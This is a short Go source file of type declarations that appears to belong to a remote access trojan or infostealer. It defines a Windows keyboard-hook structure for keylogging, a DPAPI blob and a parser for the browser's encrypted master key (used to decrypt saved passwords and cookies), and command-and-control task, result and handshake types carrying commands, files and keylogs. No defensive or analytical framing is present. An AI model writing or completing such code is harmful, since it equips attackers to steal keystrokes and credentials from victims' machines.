package main

type KBDLLHOOKSTRUCT struct {
	vkCode      uint32
	scanCode    uint32
	flags       uint32
	time        uint32
	dwExtraInfo uintptr
}

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

type LocalState struct {
	OsCrypt struct {
		EncryptedKey string `json:"encrypted_key"`
	} `json:"os_crypt"`
}

type Task struct {
	Type        string `json:"type"`
	Command     string `json:"command"`
	Path        string `json:"path"`
	FileData    string `json:"file_data"`
	Destination string `json:"destination"`
	PublicKey   string `json:"public_key,omitempty"`
}

type Result struct {
	Type     string   `json:"type"`
	Data     string   `json:"data"`
	Filename string   `json:"filename,omitempty"`
	Keylogs  string   `json:"keylogs,omitempty"`
	Errors   []string `json:"errors,omitempty"`
}

type HandshakeResponse struct {
	Status    string `json:"status"`
	PublicKey string `json:"public_key"`
}
